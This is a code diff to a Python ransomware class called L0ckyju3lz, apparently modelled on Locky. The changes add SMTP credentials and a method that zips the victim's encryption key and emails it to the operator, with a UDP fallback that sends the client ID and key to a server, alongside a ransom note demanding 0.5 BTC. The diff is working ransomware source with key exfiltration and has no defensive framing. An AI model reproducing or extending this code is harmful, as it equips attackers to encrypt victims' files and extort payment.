@@ -16,6 +16,7 @@ class L0ckyju3lz():
         # Locky
         self.key = None
         self.crypt = None
+        self.archiv_name = None
         self.file_ext_targets = ['txt']
         self.client_ID = None
         self.root_tree = None
@@ -24,15 +25,22 @@ class L0ckyju3lz():
         self.author = "PiereLucas"
         self.version = "1.0"
         self.btc_wallet = ""
-        self.server_mail = ""
+        self.response_mail = ""
         self.server_ip = None
         self.server_port = None
+
+        # SMTP
+        self.host = ""
+        self.port = ""
+        self.src_address = ""
+        self.username = ""
+        self.password = ""
 
     def readme_txt(self):
         with open("readme" + self.rnd_str() + ".txt", 'wt') as f:
             rtxt = "Infected by L0ckyju3lz" + "\n" \
             + "Send 0.5 BTC to: " + self.btc_wallet + "\n" \
-            + "Message us to get your decryption key: " + self.server_mail + "\n" \
+            + "Message us to get your decryption key: " + self.response_mail + "\n" \
             + "Your CLIENT ID: " + self.client_ID
             f.write(rtxt)
         return True
@@ -75,20 +83,43 @@ class L0ckyju3lz():
         # make archiv from key_dir
         raw_archiv_name = key_dir + "_pack"
         shutil.make_archive(raw_archiv_name, "zip", key_dir)
-        archiv_name = raw_archiv_name + ".zip"
+        self.archiv_name = raw_archiv_name + ".zip"
         # delete key_dir and key_name
         os.remove(key_path)
         os.rmdir(key_dir)
-        return archiv_name
+        return True
 
-    def send_mail(self):
+    def send_key(self):
+        if self.over_mail(): return True
+        elif self.over_udp_client(): return True
+        else: return False
+
+    def over_mail(self):
+        from email.mime.multipart import MIMEMultipart
+        from email.mime.text import MIMEText
+        from email.mime.application import MIMEApplication
         try:
-            pass
+            s = smtplib.SMTP(host=self.host, port=self.port, source_address=self.src_address)
+            s.connect()
+            s.login(user=self.username, password=self.password)
+
+            msg = MIMEMultipart()
+            msg["Subject"] = "L0ckerju3lz - New Infect
+            msg["From"] = "l0ckerju3lz@" + self.client_ID
+            msg["To"] = self.response_mail
+            text = MIMEText("Attachment: Packed Keyfile from Client " + self.client_ID)
+            msg.attach(text)
+            with open(self.archiv_name, 'rb') as f:
+                file_data = MIMEApplication(f.read())
+            msg.attach(file_data)
+
+            s.sendmail(from_addr=msg["From"], to_addrs=msg["To"], msg=msg)
+            s.quit()
             return True
         except:
             return False
 
-    def udp_client(self):
+    def over_udp_client(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             message = self.client_ID + ";" + self.key
